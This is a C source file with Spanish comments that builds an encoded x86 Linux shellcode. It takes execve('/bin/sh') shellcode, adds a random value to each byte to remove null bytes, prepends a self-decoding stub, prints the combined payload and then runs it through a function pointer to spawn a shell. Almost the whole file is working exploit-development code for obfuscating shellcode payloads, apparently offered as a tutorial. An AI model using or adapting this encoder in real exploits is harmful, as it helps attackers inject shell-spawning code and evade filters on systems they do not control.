#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#include <stdlib.h>
#include <unistd.h>

//Esta funcion se encarga de generar un numero
//aleatorio menor al parametro pasado.
int getnumber(int quo) {
    int seed;
    struct timeval tm;
    gettimeofday(&tm, NULL);
    seed = tm.tv_sec + tm.tv_usec;
    srandom(seed);
    return ( random() % quo );
}

//Esta funcion se utiliza para ejecutar los opcodes
//especificados en la cadena que se envia como
//parametro. Para ejecutar los opcodes, se declara
//un puntero a una funcion. Acto seguido, se hace
//que el puntero a la funcion apunte a la cadena
//que almacena los opcodes. Una vez el puntero
//apunta a la cadena, se ejecuta la funcion, con
//lo que se ejecutan los opcodes del shellcode.
void execute(char * data) {
    void (*func) (void);
    func = (void *) data;
    func();

}

//Esta funcion sirve para mostrar por pantalla el shellcode,
//el decodificador o la union de los dos.
void print_code(char * data, int n) {
    int i, l = 15;
    switch (n) {
        case 1:
            printf("\n\nchar code[] =\n");
        break;
        case 2:
            printf("\n\nchar decoder[] =\n");
        break;
        case 3:
            printf("\n\nchar shellcode[] =\n");
        break;
        default:
            
        break;
    }
    
    for (i = 0; i < strlen(data); ++i) {
        if (l >= 15) {
            if (i)
                printf("\"\n");
            printf("\t\"");
            l = 0;
        }
        ++l;
        printf("\\x%02x", ((unsigned char *)data)[i]);
    }
    printf("\";\n\n\n");
}

int main() {
    //Opcodes que identifican al shellcode
    char shellcode[] = 
    "\x31\xc0\x99\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";
    //Opcodes que identifican al decodificador
    char decoder[] = 
    "\xeb\x10\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00\xfe\xc9\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff";
    int count;
    //Se obtiene un numero aleatorio.
    int number = getnumber(200);
    int nullbyte = 0;
    int ldecoder;
    //Se obtiene la longitud del shellcode.
    int lshellcode = strlen(shellcode);
    char * result;

    //Se muestra por pantalla el codigo del decodificador y
    //del shellcode sin codificar.
    print_code(decoder, 2);
    print_code(shellcode, 3);


    //En la posicion de la cadena hexadecimal del decodificador donde 
    //deberia ir la longitud del shellcode, se inserta la longitud
    //calculada con la funcion strlen().    
    decoder[6] += lshellcode;
    //En la posicion de la cadena hexadecimal del decodificador donde 
    //deberia ir el numero aleatorio, se inserta la dicho numero
    //calculado con la funcion getnumber(). 
    decoder[11] += number;
    
    ldecoder = strlen(decoder);
    
    //Este bucle se realiza para sumar el numero aleatorio a cada caracter
    //hexadecimal que identifica el shellcode. Al entrar, nullbyte = 0.
    do {
        if (nullbyte == 1) {
            //Si se ha generado un byte nulo en el shellcode,
            //se genera un nuevo numero aleatorio, se modifica
            //dicho valor en el decodificador y se vuelve a
            //realizar el proceso de codificacion.
            number = getnumber(10);
            decoder[11] += number;
            nullbyte = 0;
        }
        //Se recorre todo el shellcode y a cada byte de la cadena
        //shellcode, se le suma el numero aleatorio.
        for (count = 0; count < lshellcode; count++) {
            shellcode[count] += number;
            //Si despues de realizar dicha suma, hay algun byte
            //que es cero, se debe volver a realizar todo el
            //proceso
            if (shellcode[count] == '\0') {
                nullbyte = 1;
                printf("Bad value used: %x", number);
            }
        }
    //El proceso de codificacion se llevara a cabo hasta que no haya
    //ningun byte nulo en el shellcode.
    } while (nullbyte == 1);

    //Se reserva espacio para el decodificador y el shellcode.
    result = malloc(lshellcode + ldecoder);
    //En dicho espacio de memoria se almacena el decodificador
    //y el shellcode.
    strcpy(result, decoder);
    strcat(result, shellcode);
    //Se muestra por pantalla el numero aleatorio generado y
    //la cadena que identifica al decodificador y el shellcode
    //codificado.
    printf("Using value: %x to encode shellcode\n", number);
    print_code(result, 1);
    //Por ultimo, se ejecuta el decodificador y el shellcode.
    execute(result);
    //En este momento se deberia obtener una bonita shell!
}
